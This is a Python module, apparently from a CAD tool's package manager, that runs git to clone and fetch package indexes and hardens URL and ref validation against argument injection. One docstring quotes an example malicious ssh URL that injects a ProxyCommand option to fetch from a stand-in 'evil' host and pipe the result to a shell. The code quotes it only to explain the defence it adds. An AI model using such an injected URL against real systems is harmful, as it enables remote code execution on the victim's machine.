"""The git runner for package indexes — and why it is **not** `history._run`.

`AGENTS.md` says every git call goes through `ProjectHistory._run`, never a
raw `subprocess`. That rule is a statement about **the project history
repository**, and `_run` is built for exactly that:

* it hard-codes ``--git-dir <project>/.history --work-tree <project>``;
* its timeout is **10 s**;
* it redirects ``HOME`` and ``XDG_CONFIG_HOME`` into ``.history`` and sets
  ``GIT_CONFIG_NOSYSTEM=1``, so a user's ``~/.gitconfig`` (hooks, gpg signing,
  a rewritten url) cannot interfere.

Every one of those is **wrong** for fetching a remote index. There is no work
tree — the checkout *is* the tree. A clone routinely exceeds 10 s. And
redirecting ``HOME`` disables the credential helper that a private index
repository needs, which is the one case a package registry has to serve well.

So this is a second, small runner with its own rules, and this docstring
exists so nobody "fixes" it back:

* **Fixed argv, never a shell.** ``shell=True`` is not used and no argument is
  interpolated into a string.
* **120 s timeout**, configurable per call.
* ``GIT_TERMINAL_PROMPT=0`` and ``GIT_ASKPASS=""`` so a server never blocks on
  a password prompt. ``GIT_SSH_COMMAND`` gains ``BatchMode=yes`` **only when
  the caller has not set one**, because ``GIT_TERMINAL_PROMPT`` does not cover
  ssh and a 120 s block on a passphrase prompt is the exact failure it exists
  to prevent (an ssh-agent key still works).
* **``HOME`` is not redirected**, and neither is ``XDG_CONFIG_HOME``.
* The URL is **validated**: ``https://``, ``ssh://``, ``git@host:path``,
  ``file://`` or an absolute path — never starting with ``-`` (git would read
  it as an option), **never with an ssh host that starts with ``-``** (git
  passes the host on to ssh, where ``-oProxyCommand=…`` is an option and the
  ``--`` separator protects git's argv and not ssh's), and never carrying a
  shell metacharacter. Fixed argv makes a metacharacter inert; it is still
  refused, because defence that only works when the *other* defence works is
  not defence. The **ref** is checked the same way, for the same reason: it
  reaches ``--branch`` before the ``--``.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from pathlib import Path

from ... import config as user_config
from ..model import ValidationError

#: A clone of a real catalog is not a 10 s operation.
DEFAULT_TIMEOUT = 120.0

#: Refused anywhere in a URL. Inert against fixed argv, refused anyway.
_METACHARACTERS = set(";|&$`<>()\n\r\t\\\"'*?[]{}!~ ")

_SCP_LIKE = re.compile(r"^[A-Za-z0-9_.-]+@[A-Za-z0-9_.-]+:[A-Za-z0-9_./~-]+$")
_SCHEMES = ("https://", "ssh://", "git+ssh://", "file://")

_git_path: str | None = None
_checked = False


class GitError(RuntimeError):
    """A git call that did not succeed. Carries stderr, because the message is
    the only thing that makes a fetch failure actionable."""

    def __init__(self, message: str, *, returncode: int | None = None,
                 stderr: str = ""):
        super().__init__(message)
        self.returncode = returncode
        self.stderr = stderr


def available() -> bool:
    """True when a git executable is on PATH (resolved once, cached).

    The same probe `ProjectHistory.available` makes. `load_indexes` has no
    service to borrow one from, so callers that *do* — `PackageManager` — pass
    `service.history.available` instead and this is the fallback.
    """
    global _git_path, _checked
    if not _checked:
        _git_path = shutil.which("git")
        _checked = True
    return _git_path is not None


def executable() -> str:
    available()
    return _git_path or "git"


def indexes_root() -> Path:
    """Where git index checkouts live.

    `AGENTCAD_INDEXES_DIR` overrides it outright; otherwise it sits beside
    `config.json`, so the `AGENTCAD_CONFIG` override every test already sets
    keeps checkouts out of a real home directory — `cache.root`'s rule.
    """
    override = os.environ.get("AGENTCAD_INDEXES_DIR")
    if override:
        return Path(override)
    return user_config.config_path().parent / "indexes"


def validate_url(url) -> str:
    """The URL, or a ``ValidationError`` saying which rule it broke."""
    if not isinstance(url, str) or not url:
        raise ValidationError("a git index needs a non-empty 'url'")
    if url.startswith("-"):
        raise ValidationError(
            f"refusing the git url {url!r}: a value starting with '-' would be "
            "read by git as an option, not a repository")
    bad = sorted(_METACHARACTERS & set(url))
    if bad:
        raise ValidationError(
            f"refusing the git url {url!r}: it contains {''.join(bad)!r}. "
            "Index urls are https://, ssh://, git@host:path, file:// or an "
            "absolute path")
    if url.startswith(_SCHEMES) or url.startswith("/") or _SCP_LIKE.match(url):
        _refuse_option_host(url)
        return url
    raise ValidationError(
        f"refusing the git url {url!r}: expected https://, ssh://, "
        "git@host:path, file:// or an absolute path")


def _refuse_option_host(url: str) -> None:
    """Refuse a URL whose **host** would be read by ssh as an option.

    Checking that the whole url does not start with ``-`` is not enough, and
    the difference is a remote-code-execution hole rather than a nicety:
    ``ssh://-oProxyCommand=curl%20evil|sh/x.git`` starts with ``s``, passes
    every other rule, and git hands ``-oProxyCommand=…`` to **ssh** as an
    argument, where a leading ``-`` is an option. The ``--`` separator in
    :func:`run` protects git's own argv and does nothing about ssh's.

    So the host component is extracted and checked on its own, for both
    spellings of an ssh remote.
    """
    host = None
    for scheme in ("ssh://", "git+ssh://"):
        if url.startswith(scheme):
            authority = url[len(scheme):].split("/", 1)[0]
            host = authority.rpartition("@")[2]
            break
    else:
        if _SCP_LIKE.match(url):
            host = url.partition("@")[2].partition(":")[0]
    if host is None:
        return
    if not host or host.startswith("-"):
        raise ValidationError(
            f"refusing the git url {url!r}: its host component {host!r} is "
            f"empty or starts with '-', which ssh would read as an OPTION and "
            f"not as a host. (git's own argv is protected by a '--' separator; "
            f"the arguments it passes on to ssh are not.)")


def run(*args: str, cwd=None, timeout: float = DEFAULT_TIMEOUT):
    """One git call. Fixed argv, hermetic-enough environment, no shell."""
    env = {**os.environ,
           "GIT_TERMINAL_PROMPT": "0",
           "GIT_ASKPASS": "",
           "SSH_ASKPASS": ""}
    env.setdefault("GIT_SSH_COMMAND", "ssh -o BatchMode=yes")
    cmd = [executable(), *args]
    try:
        result = subprocess.run(cmd, cwd=None if cwd is None else str(cwd),
                                env=env, capture_output=True, text=True,
                                encoding="utf-8", errors="replace",
                                timeout=timeout)
    except FileNotFoundError as exc:
        raise GitError("git is not installed") from exc
    except subprocess.TimeoutExpired as exc:
        raise GitError(f"git {args[0]} timed out after {timeout:g}s") from exc
    if result.returncode != 0:
        raise GitError(
            f"git {args[0]} failed ({result.returncode}): "
            f"{(result.stderr or '').strip().splitlines()[-1] if result.stderr else ''}",
            returncode=result.returncode, stderr=result.stderr or "")
    return result


def validate_ref(ref) -> str:
    """The ref, or a ``ValidationError``.

    ``--branch <ref>`` sits **before** the ``--`` separator, so a ref starting
    with ``-`` is an option to git — the same class of hole as an option-shaped
    host, and one line to close.
    """
    if not isinstance(ref, str) or not ref:
        raise ValidationError("a git index needs a non-empty 'ref'")
    if ref.startswith("-"):
        raise ValidationError(
            f"refusing the git ref {ref!r}: a value starting with '-' would be "
            "read by git as an option, not a ref")
    bad = sorted(_METACHARACTERS & set(ref))
    if bad:
        raise ValidationError(
            f"refusing the git ref {ref!r}: it contains {''.join(bad)!r}")
    return ref


def clone(url: str, dest, ref: str) -> None:
    """`clone --depth 1` at ``ref``. The parent is created; ``dest`` is not
    (git makes it, and a pre-made empty directory is fine either way)."""
    validate_url(url)
    validate_ref(ref)
    dest = Path(dest)
    dest.parent.mkdir(parents=True, exist_ok=True)
    run("clone", "--depth", "1", "--branch", ref, "--", url, str(dest))


def fetch(dest, url: str, ref: str) -> None:
    """`fetch --depth 1` then `reset --hard FETCH_HEAD`.

    **Reset, never merge.** An index repository whose history was rewritten
    (a force-push) must not leave the client on a branch that no longer
    exists, and a merge would invent a document nobody published.
    """
    validate_url(url)
    validate_ref(ref)
    dest = Path(dest)
    run("-C", str(dest), "fetch", "--depth", "1", "--", url, ref)
    run("-C", str(dest), "reset", "--hard", "FETCH_HEAD")
    # A rewritten history leaves the old objects reachable only from the
    # previous checkout; nothing depends on them, and `gc` is the user's call.
